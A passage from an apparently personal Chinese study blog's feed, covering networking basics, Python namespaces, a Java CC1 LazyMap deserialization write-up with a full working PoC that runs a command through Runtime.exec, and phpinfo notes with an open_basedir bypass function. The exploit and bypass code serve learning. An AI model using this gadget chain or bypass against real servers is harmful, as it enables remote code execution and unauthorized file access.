href="https://blog.csdn.net/grady1234/article/details/44804423">https://blog.csdn.net/grady1234/article/details/44804423</a></p><blockquote><p>集线器是”共享总线“，只有一条车道，一般是各主机平分带宽。</p><p>交换机是一条公路，有N条车道（取决于交换机的端口数量），所以各主机是独享带宽。</p><p>但是当只有一个车道是可以访问外网时，访问外网时又会变为各主机平分带宽。</p></blockquote><h3 id="PPP–宽带连接"><a href="#PPP–宽带连接" class="headerlink" title="PPP–宽带连接"></a>PPP–宽带连接</h3><h4 id="帧格式"><a href="#帧格式" class="headerlink" title="帧格式"></a>帧格式</h4><img src="E:\typora img\image-20221123142507857.png" alt="image-20221123142507857" style="zoom: 80%;" /><h4 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h4><img src="E:\typora img\image-20221123143056117.png" alt="image-20221123143056117" style="zoom:80%;" /><img src="E:\typora img\image-20221123143136837.png" alt="image-20221123143136837" style="zoom:80%;" /><p>PPP协议的主要特点是什么？为什么PPP不使用帧的编号？PPP适用于什么情况？为什么PPP协议不能使数据链路层实现可靠传输？</p><blockquote><p>答：</p><p>简单，提供不可靠的数据报服务，检错，无纠错;</p><p>PPP不采用序号和确认机制是出于以下的考虑：</p><p>第一， 若使用能够实现可靠传输的数据链路层协议，开销就要增大。在数据链路层出现差错的概率不大时，使用比较简单的PPP协议较为合理。</p><p>第二，数据链路层的可靠传输并不能保证网络层的传输也是可靠的。</p><p>第三， PPP协议有帧检验序列FCS字段，可以检错，所以可以保证无差错接受。</p><p>PPP适用于点到点线路并且线路质量不差的传输中，例如用户拨号连接上网。</p><p>因为PPP不使用序号和确认机制，所以无法实现可靠传输。</p></blockquote><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p>网络数量&#x3D;2^网络号</p><p>可分配地址&#x3D;2^主机号-2</p><h3 id="分类编址"><a href="#分类编址" class="headerlink" title="分类编址"></a>分类编址</h3><p>IP地址&#x3D;网络号+主机号</p><p>可分配给主机的地址&#x3D;2^x-2  （x为主机号位数；-2：网络地址+广播地址）</p><img src="E:\typora img\image-20220929214342955.png" alt="image-20220929214342955" style="zoom: 67%;" /><ul><li><p>A类地址</p><img src="E:\typora img\image-20220929214835663.png" alt="image-20220929214835663" style="zoom:67%;" /><p>​本地环回地址：通常是指127.0.0.1，不属于任何一个有类别地址类。一般都会用来检查本地网络协议、基本数据接 口等是否正常的。</p><p>​<a href="https://blog.csdn.net/u010783226/article/details/119382949">本地环回地址详解及与localhost，0.0.0.0区别</a></p><blockquote><p>总结</p><ul><li><p>127.0.0.1 是回环地址。localhost是域名，但默认等于 127.0.0.1。</p></li><li><p>ping 回环地址和 ping 本机地址，是一样的，走的是lo0 “假网卡”，都会经过网络层和数据链路层等逻辑，最后在快要出网卡前狠狠拐了个弯， 将数据插入到一个链表后就软中断通知 ksoftirqd 来进行收数据的逻辑，压根就不出网络。所以断网了也能 ping 通回环地址。</p></li><li><p>如果服务器 listen 的是 0.0.0.0，那么此时用127.0.0.1和本机地址都可以访问到服务。、</p></li></ul></blockquote></li><li><p>B类地址</p><img src="E:\typora img\image-20220929220023850.png" alt="image-20220929220023850" style="zoom:67%;" /></li><li><p>C类地址</p><img src="E:\typora img\image-20220929220352145.png" alt="image-20220929220352145" style="zoom:67%;" /></li><li><p>D类和E类</p><p>![image-20220929220439484](E:\typora img\image-20220929220439484.png)</p></li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>![image-20220929220652096](E:\typora img\image-20220929220652096.png)</p><h4 id="特殊ipv4地址"><a href="#特殊ipv4地址" class="headerlink" title="特殊ipv4地址"></a>特殊ipv4地址</h4><img src="E:\typora img\image-20220929220724192.png" alt="image-20220929220724192" style="zoom: 67%;" /><h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h3><p>IP地址&#x3D;网络号+子网号+主机号</p><p>网络地址&#x3D;网络号+子网号</p><p>网络地址&#x3D;IP地址&amp;子网掩码（因为子网掩码的主机号全0，所以&amp;运算后的结果只保留了网络号和子网号。）</p><h4 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h4><p>当局域网从只有一个子网1到拥有三个子网时：</p><img src="E:\typora img\image-20220929222609025.png" alt="image-20220929222609025" style="zoom:50%;" /><p>通过借助主机号的比特来区分子网。</p><p>但是有一个问题就是如何知道主机号中的哪些比特是用来区分子网的？</p><p>所以出现了子网掩码</p><p>注：这时候的</p><img src="E:\typora img\image-20220929223227955.png" alt="image-20220929223227955" style="zoom:67%;" /><p>​</p><p>​</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><img src="E:\typora img\image-20220929223627374.png" alt="image-20220929223627374" style="zoom:67%;" /><img src="E:\typora img\image-20220929223854504.png" alt="image-20220929223854504" style="zoom:67%;" /><p>​划分出的子网数量为2^1&#x3D;2个 （1为子网号位数）</p><h3 id="无分类编址–CIDR"><a href="#无分类编址–CIDR" class="headerlink" title="无分类编址–CIDR"></a>无分类编址–CIDR</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><img src="E:\typora img\image-20220930101726406.png" alt="image-20220930101726406" style="zoom:50%;" /><h4 id="斜线记法"><a href="#斜线记法" class="headerlink" title="斜线记法"></a>斜线记法</h4><img src="E:\typora img\image-20220930101653789.png" alt="image-20220930101653789" style="zoom: 50%;" /><h4 id="星号记法"><a href="#星号记法" class="headerlink" title="星号记法"></a>星号记法</h4><p>​网络前缀的后面加一个星号 * 的表示方法，如00001010 00*，在星号 * 之前是网络前缀，而星号 * 表示 IP 地址中的主机号，可以是任意值。</p><h4 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h4><p>​<img src="E:\typora img\image-20220930102420468.png" alt="image-20220930102420468" style="zoom: 67%;" /></p><p>​动态分配地址，有效利用ipv4地址</p><blockquote><p>​      分配网络前缀时应先分配地址数较多的前缀。</p></blockquote><p>​<img src="E:\typora img\image-20220930102439160.png" alt="image-20220930102439160" style="zoom:80%;" /></p><p>​减少路由信息所占的网络资源，原本需要记录5个路由信息，使用无分类编址只需要记录其共同前缀作为网络地址即可得到聚合地址块。</p><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><ul><li><p>定长子网掩码</p><img src="E:\typora img\image-20221001151101365.png" alt="image-20221001151101365" style="zoom: 50%;" /></li><li><p>不定长子网掩码</p><p>先根据主机数量+网络设备数量确定出主机号，从而确立出子网掩码。</p></li></ul><h3 id="ip地址与mac地址"><a href="#ip地址与mac地址" class="headerlink" title="ip地址与mac地址"></a>ip地址与mac地址</h3><img src="E:\typora img\image-20221025104225445.png" alt="image-20221025104225445" style="zoom: 80%;" /><p>为什么需要两个地址，如果只有一个地址可以吗？</p><p>不可以。因为如果只有mac地址，那么路由器就需要记录所有主机的mac地址，这需要巨大的路由存储空间以及通信资源。而如果只有ip地址，那么数据就不能到达目的主机，因为只知道主机在哪一个网络理里，而不知道主机具体在网络的哪里，ip地址就像小区号，mac地址就像门牌号，只知道小区号是找不到对方的。</p><h3 id="ip数据报"><a href="#ip数据报" class="headerlink" title="ip数据报"></a>ip数据报</h3><h5 id="发送过程"><a href="#发送过程" class="headerlink" title="发送过程"></a>发送过程</h5><p>主机A向主机B发送IP数据包</p><ol><li><p>主机A需要判断主机B与其是否在同一个网络中，若在同一个网络中可以直接交付，若不在同一个网络中，则需要路由器来间接交付。</p></li><li><p>假设是间接交付。那么主机A该将IP数据报发给哪一个路由器呢？答案是默认网关，即网络管理员设置的主机A所在以太网用来转发的默认路由器。</p></li><li><p>主机A将IP数据报转发给默认网关后，网关（即路由器）怎么知道该转发给哪个以太网呢？答案是根据路由表。</p><p>![image-20221123194349859](E:\typora img\image-20221123194349859.png)</p><p>网关将IP数据报的目标地址（即主机B的IP地址）与路由表中的子网掩码相与后得到主机B的网络地址，再查找路由表中是否有该目的网络，如果找到就按照下一跳将IP数据报转发出去。</p></li></ol><img src="E:\typora img\image-20221025114844358.png" alt="image-20221025114844358" style="zoom:80%;" /><h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><img src="E:\typora img\image-20221123193136721.png" alt="image-20221123193136721" style="zoom:80%;" /><img src="E:\typora img\image-20221123193048060.png" alt="image-20221123193048060" style="zoom:80%;" /><h3 id="VPN–虚拟专用网"><a href="#VPN–虚拟专用网" class="headerlink" title="VPN–虚拟专用网"></a>VPN–虚拟专用网</h3><img src="E:\typora img\image-20221123173248014.png" alt="image-20221123173248014" style="zoom: 80%;" /><h3 id="NAT–网络地址转换"><a href="#NAT–网络地址转换" class="headerlink" title="NAT–网络地址转换"></a>NAT–网络地址转换</h3><h5 id="内网转外网"><a href="#内网转外网" class="headerlink" title="内网转外网"></a>内网转外网</h5><img src="E:\typora img\image-20221123173626593.png" alt="image-20221123173626593" style="zoom:80%;" /><img src="E:\typora img\image-20221123173654820.png" alt="image-20221123173654820" style="zoom:80%;" /><h5 id="内网转端口"><a href="#内网转端口" class="headerlink" title="内网转端口"></a>内网转端口</h5><img src="E:\typora img\image-20221123174210026.png" alt="image-20221123174210026" style="zoom:80%;" /><h3 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h3><img src="E:\typora img\image-20221123180012945.png" alt="image-20221123180012945" style="zoom:80%;" /><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h4><img src="E:\typora img\image-20221123223516713.png" alt="image-20221123223516713" style="zoom:80%;" /><h4 id="UDP和TCP数据报格式"><a href="#UDP和TCP数据报格式" class="headerlink" title="UDP和TCP数据报格式"></a>UDP和TCP数据报格式</h4><img src="E:\typora img\image-20221123223117231.png" alt="image-20221123223117231" style="zoom:80%;" /><h4 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h4><p>![image-20221123224240643](E:\typora img\image-20221123224240643.png)</p><p>序号：指的是发送的数据载荷的第一个字节的序号。</p><p>确认号：指的是已经成功接受到序号至（确认号-1）的数据，希望对方发送的数据是从确认号开始的。</p><p>ACK：1表示成功接收，只有设置为1，确认号才是有效的。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA反序列化之CC1--LazyMap</title>
      <link href="/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1--LazyMap/"/>
      <url>/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1--LazyMap/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1–lazyMap-chains"><a href="#CC1–lazyMap-chains" class="headerlink" title="CC1–lazyMap chains"></a>CC1–lazyMap chains</h1><p><strong>ysoserial中cc1链使用的是LazyMap</strong></p><h2 id="前置知识java代理"><a href="#前置知识java代理" class="headerlink" title="前置知识java代理"></a>前置知识java代理</h2><p><a href="https://y4er.com/posts/java-proxy/">https://y4er.com/posts/java-proxy/</a></p><p>关键点</p><p><strong>被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发</strong></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>危险方法是<code>InvokerTransformer.transform()</code>，之前使用的是 TransformedMap 下的 checkSetValue 方法来调用，这次用LazyMap 下的 get 方法调用 factory.transform</p><p><img src="/../images/bc583ebe2ca03158524014c0e27c3392.png" alt="image-20220115100212144"></p><p><strong>get方法</strong></p><p><img src="/../images/image-20230930134701285.png" alt="image-20230930134701285"></p><p><strong>谁调用了get方法</strong></p><p><img src="/../images/b6b801a95373e418363d74b1f56f1edd.png" alt="image-20220115103043004"></p><p>可以看到是<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 中的invoke方法，结合动态代理可以知道invoke 方法在对象代理时会被触发。而实际上这个类实际就是一个<code>InvocationHandler</code>，我们如果将这个对象用Proxy进行代理，那么在<code>readObject</code>的时候，只要调用任意方法，就会进入到<code>AnnotationInvocationHandler#invoke</code>方法中，进而触发我们的<code>LazyMap#get</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构建对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Action.class, outerMap);</span><br><span class="line"><span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);  <span class="comment">// 动态代理对象，执行任意方法，都会到invoke中去</span></span><br></pre></td></tr></table></figure><p>代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>，所以我们还需要再用<code>AnnotationInvocationHandler</code>对这个proxyMap进行包裹（我们需要的是<code>AnnotationInvocationHandler</code>这个类的对象）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); </span><br></pre></td></tr></table></figure><p><strong>完整poc</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(handler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230930143412695.png" alt="image-20230930143412695"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpinfo中的信息</title>
      <link href="/2023/05/01/phpinfo/"/>
      <url>/2023/05/01/phpinfo/</url>
      
        <content type="html"><![CDATA[<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p><a href="https://www.php.net/manual/zh/ini.core.php">PHP: php.ini 核心指令说明 - Manual</a></p><p>ini_set()</p><p><a href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p><h1 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://www.k0rz3n.com/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/">phpinfo中的重要信息</a></p><table><thead><tr><th align="center">变量</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">open_basedir</td><td align="center">限制目录访问（可以绕过）</td></tr><tr><td align="center">disable_function</td><td align="center">禁用函数（可以绕过）</td></tr><tr><td align="center">session.save_path</td><td align="center">配合文件包含</td></tr><tr><td align="center">_SERVER</td><td align="center">各种主机信息</td></tr><tr><td align="center">pecl</td><td align="center">confing.php写🐎</td></tr></tbody></table><h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在index.php下</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">所以如果用户通过index.php来访问服务器时，只能访问/<span class="keyword">var</span>/www/html/</span><br></pre></td></tr></table></figure><p><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/">open_basedir绕过</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass_open_basedir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>))&#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_Ei34Ww_sQDfq_path</span>,<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_Ei34Ww_sQDfq_i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$_Ei34Ww_sQDfq_i</span> &lt; <span class="variable">$_Ei34Ww_sQDfq_num</span>)&#123;</span><br><span class="line">                @<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">                <span class="variable">$_Ei34Ww_sQDfq_i</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>.<span class="string">&#x27;/&#x27;</span>.<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="disable-function绕过"><a href="#disable-function绕过" class="headerlink" title="disable_function绕过"></a>disable_function绕过</h2><p>如何设置<code>disable_function</code></p><blockquote><p>在php配置文件php.ini中设置</p></blockquote><p>绕过：<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions</a></p><p>​<a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><p>常见的webshell管理工具都自带相关绕过的模块。</p><h2 id="配合文件包含Getshell"><a href="#配合文件包含Getshell" class="headerlink" title="配合文件包含Getshell"></a>配合文件包含Getshell</h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python命名空间</title>
      <link href="/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>From：<a href="https://www.bilibili.com/video/BV12F411t78n">https://www.bilibili.com/video/BV12F411t78n</a></p><p>开头说了一段话</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">lf you import another module, it will have its global scope</span><br><span class="line">每个模块都有自己的全局空间</span><br><span class="line">Each function has its local scope</span><br><span class="line">每个函数都有自己的局部空间</span><br><span class="line">Every time the function is called, a new scope is created</span><br><span class="line">每当函数被调用时，就会创建一个空间给它使用</span><br><span class="line">Certain Python objects like &#x27;print&#x27; function, &#x27;None&#x27;,&#x27;True&#x27;, &#x27;False&#x27;, are available everywhere in your program and they are in the built-in scope</span><br><span class="line">python内置的函数在程序的任何一个空间都是可以使用的，它们存在于built-in空间中。</span><br><span class="line">The variables or name bindings are stored in namespaces</span><br><span class="line">变量和函数地址都存储在命名空间中</span><br></pre></td></tr></table></figure><p>这是我根据视频的画的，左边的global空间是socket模块的，右边的global空间是我们程序的（我给它起了叫original）</p><img src="E:\typora img\Untitled-2022-08-08-1428.png" alt="Untitled-2022-08-08-1428" style="zoom:80%;" /><p>所以我们的程序处在orginal里，所以想用socket模块中的方法就必须用.来访问</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment">#创建TCP/IP套接字</span></span><br><span class="line">tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment">#创建UDP/IP套接字</span></span><br><span class="line">udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>但是我们像下面这样写，就相当于把socket模块导入到我们的命名空间original中，就可以直接调用方法了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#创建TCP/IP套接字</span></span><br><span class="line">tcpSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"><span class="comment">#创建UDP/IP套接字</span></span><br><span class="line">udpSock = socket(AF_INET, SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>什么都没有的py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    a=<span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">locals</span>())<span class="comment">#查看test函数所在的local空间</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())<span class="comment">#查看global空间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(__builtins__))<span class="comment">#查看built-in空间（就是python的内置函数和模块）</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808144812676-1687707604251.png" alt="image-20220808144812676"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#global</span></span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000023A5A4A0850</span>&gt;,  <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, </span><br><span class="line"> <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;,  </span><br><span class="line"> <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;d:\\python3.8\\code\\1.py&#x27;</span>, </span><br><span class="line"> <span class="string">&#x27;__cached__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000023A5A5E9F70</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808140251398-1687707604252.png" alt="image-20220808140251398"></p><p>因为在my_func中先使用了变量a<code>print(f&quot;iprefix&#125; &#123;a&#125;&quot;)</code>,然后才在my_func中声明了变量a,所以报错。</p><p><img src="/../images/image-20220808140402575-1687707604252.png" alt="image-20220808140402575"></p><p>在my_func中声明了<code>global a</code>,所以python知道local空间中的a指向global空间中的a。</p><p>所以在local中改变a的值，会影响global中的a。</p><p><img src="/../images/image-20220808140452593-1687707604252.png" alt="image-20220808140452593"></p><p>原本在global空间中没有变量a,但是在local中声明了<code>global a</code>，python会自动在global中分配空间给变量a。</p><blockquote><p>作者说it’s bad code😄</p></blockquote><p><img src="/../images/image-20220808140611573-1687707604252.png" alt="image-20220808140611573"></p><p><code>globals()</code>返回的是字典形式，可以通过键值索引的方式访问。</p><p><img src="/../images/image-20220808140711338-1687707604252.png" alt="image-20220808140711338"></p><p>如何展示函数的local空间中保存的变量</p><ol><li><p>函数的body中<code>print(locals())</code></p></li><li><p>通过函数的code方法下的属性访问</p><p><img src="/../images/image-20220808151843058-1687707604252.png" alt="image-20220808151843058"></p></li></ol><p><img src="/../images/image-20220808153058120-1687707604253.png" alt="image-20220808153058120"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">x=<span class="number">20</span></span><br><span 